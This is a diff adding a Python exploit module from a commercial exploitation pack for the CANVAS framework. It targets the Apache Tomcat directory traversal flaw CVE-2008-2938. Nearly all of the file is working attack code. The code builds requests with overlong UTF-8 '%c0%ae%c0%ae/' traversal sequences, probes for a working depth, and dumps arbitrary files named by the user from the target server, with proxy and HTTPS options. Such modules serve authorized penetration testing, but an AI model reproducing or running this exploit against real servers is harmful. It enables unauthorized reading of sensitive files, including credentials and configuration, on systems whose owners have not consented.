@@ -1,0 +1,181 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2008
+#
+
+import sys, time, os
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from httplib import HTTPConnection, HTTPSConnection
+
+NAME = "Apache Tomcat Directory Traversal"
+VERSION = "0.1"
+DESCRIPTION = "Apache Tomcat Directory Traversal Vulnerability"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux"], ["Windows"], ["Solaris"], ["AIX"], ["FreeBSD"], ["MacOSX"], ["HP-UX"] ]
+
+NOTES="""
+Argument flist: specify a file containing a list of files to dump
+"""
+
+DOCUMENTATION = {}
+DOCUMENTATION["Versions Affected"] = "4.1.0 through 4.1.37, 5.5.0 through 5.5.26, and 6.0.0 through 6.0.16"
+DOCUMENTATION["Date public"] = "2008/08/11"
+DOCUMENTATION["References"] = "http://www.securityfocus.com/bid/30633"
+DOCUMENTATION["CVE Name"] = "CVE-2008-2938"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2938"
+DOCUMENTATION["Notes"] = NOTES
+
+class theexploit (tcpexploit):
+    
+	def __init__(self):
+		tcpexploit.__init__(self)
+		self.host = ""
+		self.port = 80 
+		self.page = "/sample"
+		self.file = ""
+		self.flist = ""
+		self.https = 0
+		self.website = self.host
+		self.proxy_host = ""
+		self.proxy_port = 0
+		self.depth = 1
+		self.maxdepth = -1 
+		self.name = NAME
+		return
+	
+	def display_file(self, depth, file):
+		request = self.page + "/" + "%c0%ae%c0%ae/" * depth + file
+
+		try:
+			if self.proxy_host and self.proxy_port > 0:
+				cnx = HTTPConnection(self.proxy_host, self.proxy_port)
+				if self.https == 0:
+					cnx.request("GET","http://"+self.host+"/"+request,None,{"Host":self.website})
+				else:
+					cnx.request("GET","https://"+self.host+"/"+request,None,{"Host":self.website})
+
+			else:
+				if self.https == 0:
+					cnx = HTTPConnection(self.host, self.port)
+				else:
+					cnx = HTTPSConnection(self.host, self.port)
+
+				cnx.request("GET",request,None,{"Host":self.website})
+
+			resp = cnx.getresponse()
+
+			body = resp.read()
+
+			try:
+				cnx.close()
+			except Exception:
+				pass
+
+		except Exception:
+			try:
+				cnx.close()
+			except Exception:
+				pass
+			body = "HTTP(S) Transfer error"
+
+		if body.find("Error report") >= 0:
+			return ""
+		else:
+			return body
+
+	def getargs(self):	
+		self.host = self.target.interface
+		self.port = int(self.argsDict.get("port",self.port))
+		self.file = self.argsDict.get("file",self.file)
+		self.flist = self.argsDict.get("flist",self.flist)
+		self.page = self.argsDict.get("page",self.page)
+		self.https = int(self.argsDict.get("https",self.https))
+		self.website = self.argsDict.get("website",self.website)
+		self.proxy_host = self.argsDict.get("hproxy",self.proxy_host)
+		self.proxy_port = self.argsDict.get("pproxy",self.proxy_port)
+
+		depth = self.argsDict.get("depth",self.depth)
+		if len(depth) > 0:
+			self.depth = int(depth)
+
+		max = self.argsDict.get("maxdepth",self.maxdepth)
+		if max > 0:
+			self.maxdepth = int(max)
+
+	def run(self):
+		self.getargs()
+
+		self.setInfo("%s attacking %s:%d"%(NAME,self.host,self.port))
+
+		if len(self.file) > 0 and len(self.flist) > 0:
+			self.log("You must only specify a file or a list of files")
+			self.setInfo("%s attacking %s:%d - failed" % (NAME,self.host,self.port))
+			return 1
+
+		flist = []
+
+		if len(self.file) > 0:
+			flist.append(self.file)
+		elif len(self.flist) > 0:
+			try:
+				f = open(self.flist, "r")
+			except:
+				self.log("Can't find %s" % self.flist)
+				self.setInfo("%s attacking %s:%d - failed" % (NAME,self.host,self.port))
+				return 1
+
+			ftemp = f.readlines()
+			f.close()
+
+			for file in ftemp:
+				file = file.strip()
+				flist.append(file)
+		else:
+			self.log("No file or list of files specified")
+			self.setInfo("%s attacking %s:%d - failed" % (NAME,self.host,self.port))
+			return 1
+		
+		good_depth = -1
+
+		if self.maxdepth > 0:
+			d = 1
+			while d <= self.maxdepth:
+				body = self.display_file(d, flist[0])
+				if len(body) > 0:
+					good_depth = d
+					break
+				d += 1
+		else:
+			good_depth = self.depth
+
+		for file in flist:
+			self.log("[#] %s" % file)
+			self.log(self.display_file(good_depth, file))
+			self.log("\n")
+
+		self.setInfo("%s attacking %s:%d - done"%(NAME,self.host,self.port))
+
+		return 0
+
+	def usage(self):
+		print "Usage: "+sys.argv[0]+" -t target [-p port:80] -O https:[0|1] -O hproxy:host -O pproxy:port -O website:<url> -O page:<folder> -O file:<path> -O flist:<path> -O maxdepth:<maxdepth> -O depth:<depth>" 
+		sys.exit(0)
+    
+if __name__ == '__main__':
+	print "Running CANVAS %s v %s" % (NAME,VERSION)
+	app = theexploit()
+	ret = standard_callback_commandline(app)
